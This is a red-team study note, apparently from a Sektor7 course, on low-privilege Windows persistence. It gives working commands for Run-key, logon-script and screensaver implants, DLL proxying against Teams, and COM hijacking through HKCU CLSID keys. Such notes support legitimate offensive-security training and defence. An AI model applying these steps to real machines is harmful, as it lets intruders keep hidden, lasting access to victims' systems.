#Low Privilege Persistence Mehtods.
- Start Folder & Registry Keys - 
- We can upload an implant to the startup folder %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup. Uploading the implant here would give us persistence when the computer is restarted our payload would run.
- We can also create a lnk file in the startup folder to our implant executable and it will run at startup.

- We can also edit the registry key for HKCU\Software\Microsoft\Windows\CurrentVersion\Run | RunOnce.
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /t REG_SZ /d C:\path_to_implant.exe /f


- Logon Scripts -
- When the user logins to the system, there is a process called user-init that launches local logon scripts.
- All you have to do is set a value in the registry in order to make this work.
- HKEY_CURRENT_USER\Environment - If you add an additional value to the Environment key, you're telling user-init to run this script at logon.
reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "C:\path_to_script.bat" /t REG_SZ /f

.bat contents - 
@ECHO OFF

C:\path_to_binary\implant.exe

- Shortcut Modifications - 
- Requires enduser to use a shortcut on desktop or taskbar icon. Just right click on the shortcut icon go to the properties tab and change the target. The sektor7 course uses a VBS script to modify the target to another vbs script that will execute the implant & then execute the original lnk target.

- Screensavers -
- can obtain persistence by changing the default screensaver
- You need to change some registry keys to obtain this persistence method.
- HKEY_CURRENT_USER\Control Panel\Destop
reg add "HEY_CURRENT_USER\Control panel\Destop" /v "SCRNSAVE.EXE" /t REG_SZ /d "C:\path_to_implant\implant.exe" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "seconds to timeout i.e. 10" /f
- This screen saver can be set by group policy in AD. Which would require a bypass or you'd need to find a different persistence method.

- PowerShell Profile -
- This would not work on every windows machine, this is because it's configuration specific.
- The reason why is we're exploiting the environment to execute code. For example, when a user logons if a powershell script is run, we can replace the profile with a malicious one.
- you can also replace the user's powershell profile script. %HOMEPATH%\Documents\WindowsPowerShell\profile.ps1.

- DLL Proxying - 
- DLL Loading - When a process is started system loader loads the main module of the application & ntdll module, then checks for additional libraries needed by the program and load those as well.
- DLL Search Order used for loading DLLs into process memory.
1) KnownDLLs object
2) Apps current directory
3) C:\Windows\System32\ | SysWoW64
4) C:\Windows\System\
5) C:\Windows\
6) Current Directory
7) %PATH%
- If we place a DLL in one of the higher up search order paths with the same name then we will have successfully loaded our malicious implant into the target process.
- However, if we successfully hijack a module that's supposed to be loaded into the process that is used frequently we will end up crashing the process.
- To prevent this, we can implement DLL proxying.
- There are 2 requirements to make this work correctly, the first is that the target application needs to be run automatically when the computer boots i.e. by startup / task scheduler, the second is that the program must be vulnerable to DLL hijacking.
- To find this query the current registry setting:
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
- Search a users startup folder: 
powershell: ls "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
cmd: C:\Users\User\AppData\Microsoft\Windows\Start Menu\Prgroams\Startup
- Then you need to use process monitor with the following filters enabled: 1. the name of the target process that starts automatically. 2. The result contains NOT FOUND filter that will tell us when a DLL load attempt is made but it's not completed due to it being missing.
- Then we need to suspend the process w/ process hacker and compare the DLL's that are actually loaded int he process w/ the missing ones. Since the app folder is the first one checked it's likely the DLLs are found in the subsequent folder paths.
- Easiest way to do this is find a DLL that only has a limited amount of imports from the target application.
- Create a DLL that targets the hijacked DLL using linking: Example below:
#pragma comment(linker,"/export:CoInternetCreateSecurityManager=Urlmonhlp.CoInternetCreateSecurityManager,@14")
- Copy the original DLL with the name speicifed next to the ='s sign. "Urlmonhlp.dll" into the target application folder as well as the newly compiled malicious DLL into the application folder w/ the name of the target dll. in this case Urlmon.dll.
copy .\DLLProxying.dll "C:\Users\Brendan Ortiz\AppData\Local\Microsoft\Teams\current\urlmon.dll"
copy C:\Windows\system32\urlmon.dll "C:\Users\Brendan Ortiz\AppData\Local\Microsoft\Teams\current\urlmonhlp.dll"


- COM -
- COM is a platform-independent, distributed, object-oriented system for creating binary software components.
- Language agnostic. A developer can create a COM library in C++ and that library can be used by a C# project.
- COM provides an ABI.
- COMS are mostly implemented as DLLs sometimes EXEs.
- COMs are recognized by GUID (Class ID)
- COM objects can live on a remote machine, but the application will never know that it's serviced by a remote computer. It will look like a local function call to the application.
- App.exe calls CoCreateInstance() or CoGetClassObject() using the GUID (Implmented in OLE32.dll) -> the OLE passes request to the SCM (Service Control Manager) -> SCM queries the registry HKEY_CLASSES_ROOT hive (Information is compiled from HKEY_CURRENT_USER\Software\Classess && HKEY_LOCAL_MACHINE\Software\Classes). Current user is searched then if it's missing local machine is searched for the class.
- If the GUID is found it will take the information from the registry hive (normally a DLL path), and load that DLL into the process.
- We can Hijack the HKEY_CURRENT_USER registry hive check to gain persistence! Basically, the same as DLL Hijacking but we change a registry key.
- If the COM object is implemented in a EXE rather than a DLL, the EXE creates a new process where the COM server lives, and the original COM initializing process will be able to communicate with this new process via RPC.
- HKEY_CLASSES_ROOT contains a CLSID (Class ID) registry key that holds COM object ID keys. If you select one of the class id keys, you can further select the class name for example InprocServer32 class key holds information about where to find the COM object server library. For example, C:\windows\system32\oleaut32.dll. When a process initializes a COM object it will load this dll into it's process.
- However, you can also find a short list of COM object class id guids under HKEY_CURRENT_USER\Software\Classes\CLSID\.
- To find a COM object that is hijackable, it's similar to DLL hijacking. We need to find a candidate that is triggered at boot time or at user logon time.
  - A candidate can be found using task scheduler.
  - schtasks /query /xml > C:\path\tasks.xml
  - When we are searching our task scheduler output we want to look for an <Exec> section that has a COM handler rather than an executable path. Additionally, we are looking for triggers such as "Logon trigger". An example of a potential candidated would look like the following:
  
  <Triggers>
    <LogonTrigger>
      <Delay>PT5M</Delay> - 5 minute delay.
    </LogonTrigger>
  </Triggers>
  <Actions Context="InteractiveUsers">
    <ComHandler>
      <ClassId>{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}</ClassId>
      <Data><![CDATA[Logon]]></Data>


- We then query what the com object looks like in the registry.

reg query "HKCR\CLSID\{FA3F3DD9-4C1A-456B-A8FA-C76EF3ED83B8}"

HKEY_CLASSES_ROOT\CLSID\{FA3F3DD9-4C1A-456B-A8FA-C76EF3ED83B8}
    (Default)    REG_SZ    Offline Files Background Synchronization Task Handler

HKEY_CLASSES_ROOT\CLSID\{FA3F3DD9-4C1A-456B-A8FA-C76EF3ED83B8}\InProcServer32

PS C:\Users\Brendan Ortiz> reg query "HKCR\CLSID\{FA3F3DD9-4C1A-456B-A8FA-C76EF3ED83B8}\InProcServer32"

HKEY_CLASSES_ROOT\CLSID\{FA3F3DD9-4C1A-456B-A8FA-C76EF3ED83B8}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\System32\cscui.dll
    ThreadingModel    REG_SZ    Both
- THen we need to determine if it sits in the current user classes directory or the local machine classes directory.

PS C:\Users\Brendan Ortiz> reg query "HKCU\software\classes\clsid\{FA3F3DD9-4C1A-456B-A8FA-C76EF3ED83B8}\InProcServer32"
ERROR: The system was unable to find the specified registry key or value.
reg query "HKLM\software\classes\clsid\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InProcServer32"

HKEY_LOCAL_MACHINE\software\classes\clsid\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InProcServer32
    (Default)    REG_SZ    C:\Windows\System32\WorkFoldersShell.dll
    
- We now know that the class lives in the local machine directory. However, if we put something in the current user directory we will hijack this COM object because HKCU is searched first.
- Next we export the registry key
reg export "HKLM\software\classes\clsid\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InProcServer32" C:\sektor7\RTO-pers\InProServer32.old.reg /reg:64 /y
The operation completed successfully.
- If you look at COM definiton, every COM library has to have a function DllGetClassObject() which gets called by the calling application. We implement that function and export it.
- Next, after your library is compiled, you'll want to change the registry key we exported to fit our current implant. 1) change from local machine to current user, then change DLL path to our implant path.
- Then we import the registry key and double check its validity:
 reg import C:\sektor7\RTO-pers\InProServer32.old.reg /reg:64
The operation completed successfully.

reg import C:\sektor7\RTO-pers\InProServer32.old.reg /reg:64
The operation completed successfully.
PS C:\Users\Brendan Ortiz> reg query "HKCU\software\classes\clsid\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InProcServer32"

HKEY_CURRENT_USER\software\classes\clsid\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InProcServer32
    (Default)    REG_SZ    C:\sektor7\RTO-pers\VSPersistence\01.User\02.COMHijacking\COM_Hijacker\x64\Release\WrkFoldersShell.dll

- Scheduled Tasks - 
- You can set scheduled tasks as regular user or local admin.
- With local admin you can configure more powerful options and you can schdule it to run in elevated mode.
